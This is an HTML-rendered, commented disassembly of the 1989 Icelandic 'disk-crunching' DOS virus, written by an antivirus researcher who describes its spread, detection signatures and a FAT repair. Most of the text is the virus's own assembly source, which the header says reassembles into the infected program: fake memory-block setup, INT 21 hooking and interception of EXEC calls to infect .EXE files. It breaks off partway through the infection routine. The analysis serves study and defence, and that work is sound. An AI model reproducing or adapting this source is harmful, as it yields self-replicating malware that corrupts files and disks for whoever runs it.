<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>ICE1.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;       THE ICELANDIC "DISK-CRUNCHING" VIRUS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Another possible name for this virus might be "One-in-ten", since</span><span class="sc0">
</span><span class="sc1">;       it tries to infect every tenth program run. The Icelandic name for</span><span class="sc0">
</span><span class="sc1">;       this virus ("Diskaetuvirus") translates to "Disk-eating virus"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       It was first located at one site in mid-June '89. It has since then</span><span class="sc0">
</span><span class="sc1">;       been found at a few other places, but is quite rare yet. So far it</span><span class="sc0">
</span><span class="sc1">;       does not seem to have spread to any other country.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Disassembly done in June/July '89.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The author of this program is unknown, but it appears to be of</span><span class="sc0">
</span><span class="sc1">;       Icelandic origin.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       All comments in this file were added by Fridrik Skulason,</span><span class="sc0">
</span><span class="sc1">;       University of Iceland/Computing Services.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       INTERNET:     frisk@rhi.hi.is</span><span class="sc0">
</span><span class="sc1">;       UUCP:         ...mcvax!hafro!rhi!frisk</span><span class="sc0">
</span><span class="sc1">;       BIX:          FRISK</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       To anyone who obtains this file - please be careful with it, I</span><span class="sc0">
</span><span class="sc1">;       would not like to see this virus be distributed too much. The code</span><span class="sc0">
</span><span class="sc1">;       is very clear, and the virus is quite well written. It would be VERY</span><span class="sc0">
</span><span class="sc1">;       easy to modify it to do something really harmful.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       A short description of the virus:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       It only infects .EXE files. Infected files grow by 656 to 671</span><span class="sc0">
</span><span class="sc1">;       bytes, and the length of the infected file MOD 16 will always be 0.</span><span class="sc0">
</span><span class="sc1">;       The virus attaches itself to the end of the programs it infects.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       When an infected file is run, the virus copies itself to top of</span><span class="sc0">
</span><span class="sc1">;       free memory, and modifies the memory blocks, in order to hide from</span><span class="sc0">
</span><span class="sc1">;       memory mapping programs. Some programs may overwrite this area,</span><span class="sc0">
</span><span class="sc1">;       causing the computer to crash.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus does nothing if some other program has hooked INT 13</span><span class="sc0">
</span><span class="sc1">;       before it is run. This is probably done to avoid detection by</span><span class="sc0">
</span><span class="sc1">;       protection programs, but it also means that many ordinary</span><span class="sc0">
</span><span class="sc1">;       programs like SideKick and disk cache software will disable it.</span><span class="sc0">
</span><span class="sc1">;       Even the PRINT command will disable the virus. This reduces the</span><span class="sc0">
</span><span class="sc1">;       spread of the virus, but also greatly reduces the possibility that</span><span class="sc0">
</span><span class="sc1">;       the virus will be detected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus will hook INT 21H and when function 4B (EXEC) is called</span><span class="sc0">
</span><span class="sc1">;       it sometimes will infect the program being run. It will check every</span><span class="sc0">
</span><span class="sc1">;       tenth program that is run for infection, and if it is not already</span><span class="sc0">
</span><span class="sc1">;       infected, it will be.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus will remove the Read-Only attribute before trying to</span><span class="sc0">
</span><span class="sc1">;       infect programs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Infected files can be easily recognized, since they always end in</span><span class="sc0">
</span><span class="sc1">;       4418,5F19.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       To check for system infection, a byte at 0:37F is used - if it</span><span class="sc0">
</span><span class="sc1">;       contains FF the virus is installed in memory.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This virus is slightly harmful, but does no serious damage.</span><span class="sc0">
</span><span class="sc1">;       On floppy-only, or machines with 10Mbyte hard disks it will do</span><span class="sc0">
</span><span class="sc1">;       no damage at all, but on machines with larger hard disks it will</span><span class="sc0">
</span><span class="sc1">;       select one unused entry in the FAT table, and mark it as bad, when it</span><span class="sc0">
</span><span class="sc1">;       infects a file. Since the virus only modifies the first copy of the</span><span class="sc0">
</span><span class="sc1">;       FAT, a quick fix is simply to copy the second table over the first.</span><span class="sc0">
</span><span class="sc1">;       This is the only "mistake" I have found in this virus. It appears</span><span class="sc0">
</span><span class="sc1">;       to be very well written - What a shame the programmer did not use</span><span class="sc0">
</span><span class="sc1">;       his abilities for something more constructive.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This file was created in the following way: I wrote a small program,</span><span class="sc0">
</span><span class="sc1">;       that did nothing but write "Hello world!" and ran it several times,</span><span class="sc0">
</span><span class="sc1">;       until it became infected. I then diassembled the program, changed</span><span class="sc0">
</span><span class="sc1">;       it into an .ASM file, and worked on it until this file, when</span><span class="sc0">
</span><span class="sc1">;       assembled, produced the same file as the original infected one.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       (Or almost the same - the checksum in the header is different).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">VIRSIZ</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">128</span><span class="sc0">
 
        </span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc4">,</span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This is the original program.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_TEXT1</span><span class="sc0">  </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
</span><span class="sc5">_START</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0b4H</span><span class="sc4">,</span><span class="sc2">09H</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">STRING</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4C00H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
</span><span class="sc5">STRING</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Hello world!"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"$"</span><span class="sc0">
 </span><span class="sc5">_TEXT1</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">
 
</span><span class="sc5">_TEXT</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
 
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus is basically divided in three parts.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       1. The main program - run when an infected program is run.</span><span class="sc0">
</span><span class="sc1">;          It will check if the system is already infected, and if not</span><span class="sc0">
</span><span class="sc1">;          it will install the virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       2. The new INT 21 handler. It will look for EXEC calls, and</span><span class="sc0">
</span><span class="sc1">;          (sometimes) infect the program being run.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       3. The damage routine. It will select one unused cluster and mark it</span><span class="sc0">
</span><span class="sc1">;          as bad.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">VIRUS</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This is a fake MCB</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Z'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc5">VIRSIZ</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus starts by pushing the original start address on the stack,</span><span class="sc0">
</span><span class="sc1">;       so it can transfer control there when finished.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LABEL1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Put the the original CS on the stack. The ADD AX,data instruction</span><span class="sc0">
</span><span class="sc1">;       is modified by the virus when it infects other programs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">05H</span><span class="sc0">
</span><span class="sc5">ORG_CS</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0010H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Put the the original IP on the stack. This MOV [BP+2],data instruction</span><span class="sc0">
</span><span class="sc1">;       is modified by the virus when it infects other programs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc2">46H</span><span class="sc4">,</span><span class="sc2">02H</span><span class="sc0">
</span><span class="sc5">ORG_IP</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Save all registers that are modified.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Check if already installed. Quit if so.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">37FH</span><span class="sc4">],</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc2">0FFH</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">L1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Restore all registers and return to the original program.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Check if INT 13 is 0070:xxxx or F000:xxxx. If not, assume some</span><span class="sc0">
</span><span class="sc1">;       program is monitoring int 13, and quit.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">4EH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0070H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L2</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0F000H</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">EXIT</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Set the installation flag, so infected programs run later will</span><span class="sc0">
</span><span class="sc1">;       recognize the infection.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">37FH</span><span class="sc4">],</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc2">0FFH</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus tries to hide from detection by modifying the memory block it</span><span class="sc0">
</span><span class="sc1">;       uses, so it seems to be a block that belongs to the operating system.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       It looks rather weird, but it seems to work.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">52H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">0001</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Next, the virus modifies the memory block of the infected program.</span><span class="sc0">
</span><span class="sc1">;       It is made smaller, and no longer the last block.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0000</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">VIRSIZ</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Then the virus moves itself to the new block. For some reason 2000</span><span class="sc0">
</span><span class="sc1">;       bytes are transferred, when 656 would be enough. Maybe the author just</span><span class="sc0">
</span><span class="sc1">;       wanted to leave room for future expansions.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2000</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus then transfers control to the new copy of itself.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">L3</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The main program modifies INT 21 next and finally returns to the</span><span class="sc0">
</span><span class="sc1">;       original program. The original INT 21 vector is stored inside the</span><span class="sc0">
</span><span class="sc1">;       program so a JMP [OLD INT21] instruction can be used.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0084H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD21</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0086H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0086H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW21</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0084H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">EXIT</span><span class="sc0">
</span><span class="sc5">VIRUS</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This is the INT 21 replacement. It only does something in the case</span><span class="sc0">
</span><span class="sc1">;       of an EXEC call.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NEW21</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4BH</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L5</span><span class="sc0">
</span><span class="sc5">L4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAH</span><span class="sc0">
</span><span class="sc5">OLD21</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Only attack every tenth program run.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L5</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">COUNTER</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">L4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">COUNTER</span><span class="sc4">],</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Save all affected registers.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Search for the file name extension ...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">L6</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L8</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">L6</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       ... and quit unless it starts with "EX".</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L7</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">L4</span><span class="sc0">
</span><span class="sc5">L8</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">5845H</span><span class="sc0">
